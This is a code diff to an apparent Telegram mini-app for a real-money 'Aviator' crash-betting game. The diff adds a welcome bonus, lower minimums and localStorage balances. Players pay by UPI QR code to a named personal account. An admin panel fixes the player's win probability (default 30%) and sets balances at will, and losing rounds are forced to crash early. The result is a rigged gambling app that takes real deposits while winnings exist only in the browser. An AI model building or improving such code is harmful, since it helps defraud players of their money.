@@ -78,14 +78,23 @@
       background: white;
       padding: 5px;
     }
+    .welcome-banner {
+      background: #2563eb;
+      color: white;
+      padding: 8px;
+      border-radius: 6px;
+      margin-bottom: 10px;
+      font-size: 14px;
+    }
   </style>
 </head>
 <body>
 
   <!-- Header & Balance -->
   <div class="card">
+    <div id="welcome-msg" class="welcome-banner" style="display:none;">🎉 Welcome! ₹10 Bonus Added to your Wallet!</div>
     <div>Wallet Balance</div>
-    <div class="balance-box">₹<span id="user-balance">500.00</span></div>
+    <div class="balance-box">₹<span id="user-balance">0.00</span></div>
     <div class="btn-group">
       <button class="btn-deposit" onclick="showTab('deposit-tab')">➕ Deposit</button>
       <button class="btn-withdraw" onclick="showTab('withdraw-tab')">➖ Withdraw</button>
@@ -97,7 +106,7 @@
     <div class="game-screen" id="display">
       <span id="multiplier">1.00x</span>
     </div>
-    <input type="number" id="bet-amount" value="50" placeholder="Bet Amount (₹)">
+    <input type="number" id="bet-amount" value="5" placeholder="Bet Amount (₹)">
     <button class="btn-action" id="game-btn" onclick="toggleGame()">BET (START)</button>
     <button class="btn-admin" onclick="showTab('admin-tab')">⚙️ Admin Control Panel</button>
   </div>
@@ -107,7 +116,6 @@
     <h3>Add Funds (UPI QR)</h3>
     <p style="font-size: 13px; color: #94a3b8;">Scan & Pay via Google Pay, PhonePe, Paytm</p>
     
-    <!-- Auto Generated UPI QR Code for ypuneet440@okaxis -->
     <img class="qr-img" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=ypuneet440@okaxis%26pn=Puneet%20Yadav" alt="UPI QR">
     
     <p>UPI ID: <b>ypuneet440@okaxis</b></p>
@@ -120,7 +128,7 @@
   <!-- Withdraw Section -->
   <div id="withdraw-tab" class="tab-content card">
     <h3>Withdraw Funds</h3>
-    <input type="number" id="wd-amount" placeholder="Enter Amount (Min ₹200)">
+    <input type="number" id="wd-amount" placeholder="Enter Amount (Min ₹50)">
     <input type="text" id="wd-upi" placeholder="Enter Your UPI ID">
     <button class="btn-withdraw" onclick="submitWithdraw()">Submit Withdrawal Request</button>
     <button style="background:#64748b; color:white; margin-top:8px;" onclick="showTab('game-tab')">Back to Game</button>
@@ -129,16 +137,14 @@
   <!-- Admin Control Panel -->
   <div id="admin-tab" class="tab-content card">
     <h3>⚙️ Admin Owner Panel</h3>
-    <p style="font-size: 12px; color: #cbd5e1;">Control User Balance & Profit Settings</p>
-    
     <label>Set Wallet Balance (₹):</label>
-    <input type="number" id="admin-set-bal" value="500">
+    <input type="number" id="admin-set-bal">
     <button class="btn-deposit" style="margin-bottom: 12px;" onclick="updateBalance()">Update Balance</button>
     
-    <label>User Win Probability (0.1 = 10% Win, 0.8 = 80% Win):</label>
+    <label>User Win Probability (0.1 = 10%, 0.8 = 80%):</label>
     <input type="number" step="0.1" id="admin-win-rate" value="0.3">
     
-    <button class="btn-withdraw" onclick="saveAdminSettings()">Save Profit Settings</button>
+    <button class="btn-withdraw" onclick="saveAdminSettings()">Save Settings</button>
     <button style="background:#64748b; color:white; margin-top:8px;" onclick="showTab('game-tab')">Back to Game</button>
   </div>
 
@@ -146,11 +152,33 @@
     let tg = window.Telegram.WebApp;
     if(tg) tg.expand();
 
-    let balance = 500.00;
-    let winProbability = 0.3; // Default 30% User Win Rate
+    // Fetch user details from Telegram
+    let tgUser = tg && tg.initDataUnsafe ? tg.initDataUnsafe.user : null;
+    let userName = tgUser ? (tgUser.first_name + " " + (tgUser.last_name || "")) : "Guest User";
+    let userId = tgUser ? tgUser.id : "Unknown ID";
+
+    // Balance Memory System (localStorage)
+    let balance = parseFloat(localStorage.getItem('aviator_user_balance'));
+    
+    if (isNaN(balance)) {
+      balance = 10.00; // New User ₹10 Welcome Bonus
+      localStorage.setItem('aviator_user_balance', balance);
+      document.getElementById('welcome-msg').style.display = 'block';
+    }
+
+    document.getElementById('user-balance').innerText = balance.toFixed(2);
+    document.getElementById('admin-set-bal').value = balance;
+
+    let winProbability = parseFloat(localStorage.getItem('aviator_win_rate')) || 0.3;
     let isPlaying = false;
     let timer = null;
     let currentMultiplier = 1.00;
+
+    function saveBalanceLocally(newBal) {
+      balance = newBal;
+      localStorage.setItem('aviator_user_balance', balance);
+      document.getElementById('user-balance').innerText = balance.toFixed(2);
+    }
 
     function showTab(tabId) {
       document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
@@ -168,9 +196,7 @@
           return;
         }
 
-        // Deduct Bet
-        balance -= bet;
-        document.getElementById('user-balance').innerText = balance.toFixed(2);
+        saveBalanceLocally(balance - bet);
 
         isPlaying = true;
         btn.innerText = "CASH OUT";
@@ -178,7 +204,7 @@
 
         currentMultiplier = 1.00;
         let isWinRound = Math.random() < winProbability;
-        let crashPoint = isWinRound ? (Math.random() * 4 + 1.5).toFixed(2) : (Math.random() * 0.3 + 1.05).toFixed(2);
+        let crashPoint = isWinRound ? (Math.random() * 3 + 1.5).toFixed(2) : (Math.random() * 0.3 + 1.02).toFixed(2);
 
         timer = setInterval(() => {
           currentMultiplier += 0.05;
@@ -197,13 +223,11 @@
         }, 80);
 
       } else {
-        // Cashout Action
         clearInterval(timer);
         let winAmt = bet * currentMultiplier;
-        balance += winAmt;
-        document.getElementById('user-balance').innerText = balance.toFixed(2);
+        saveBalanceLocally(balance + winAmt);
 
-        alert("Cashed Out Successfully! Won: ₹" + winAmt.toFixed(2));
+        alert("Cashed Out! Won: ₹" + winAmt.toFixed(2));
         btn.innerText = "BET (START)";
         btn.style.background = "#ef4444";
         isPlaying = false;
@@ -217,10 +241,18 @@
         alert("Enter Amount and UTR Number!");
         return;
       }
-      if(tg && tg.sendData) {
-        tg.sendData(JSON.stringify({ action: "DEPOSIT", amount: amt, utr: utr }));
-      }
-      alert("Deposit Request Submitted! Verification Pending.");
+      
+      let payload = {
+        action: "DEPOSIT",
+        user: userName,
+        id: userId,
+        amount: amt,
+        utr: utr
+      };
+
+      if(tg && tg.sendData) tg.sendData(JSON.stringify(payload));
+      
+      alert("Deposit Request Submitted! Admin ko alert bhej diya gaya hai.");
       showTab('game-tab');
     }
 
@@ -235,11 +267,19 @@
         alert("Enter valid Amount & UPI ID!");
         return;
       }
-      balance -= amt;
-      document.getElementById('user-balance').innerText = balance.toFixed(2);
-      if(tg && tg.sendData) {
-        tg.sendData(JSON.stringify({ action: "WITHDRAW", amount: amt, upi: upi }));
-      }
+
+      saveBalanceLocally(balance - amt);
+
+      let payload = {
+        action: "WITHDRAW",
+        user: userName,
+        id: userId,
+        amount: amt,
+        upi: upi
+      };
+
+      if(tg && tg.sendData) tg.sendData(JSON.stringify(payload));
+
       alert("Withdrawal Request Submitted!");
       showTab('game-tab');
     }
@@ -247,8 +287,7 @@
     function updateBalance() {
       let newBal = parseFloat(document.getElementById('admin-set-bal').value);
       if (!isNaN(newBal)) {
-        balance = newBal;
-        document.getElementById('user-balance').innerText = balance.toFixed(2);
+        saveBalanceLocally(newBal);
         alert("Balance Updated to ₹" + newBal);
       }
     }
@@ -257,10 +296,9 @@
       let rate = parseFloat(document.getElementById('admin-win-rate').value);
       if (!isNaN(rate) && rate >= 0 && rate <= 1) {
         winProbability = rate;
-        alert("Win Probability Set to " + (rate * 100) + "%");
+        localStorage.setItem('aviator_win_rate', winProbability);
+        alert("Win Rate Saved!");
         showTab('game-tab');
-      } else {
-        alert("Value must be between 0 and 1");
       }
     }
   </script>
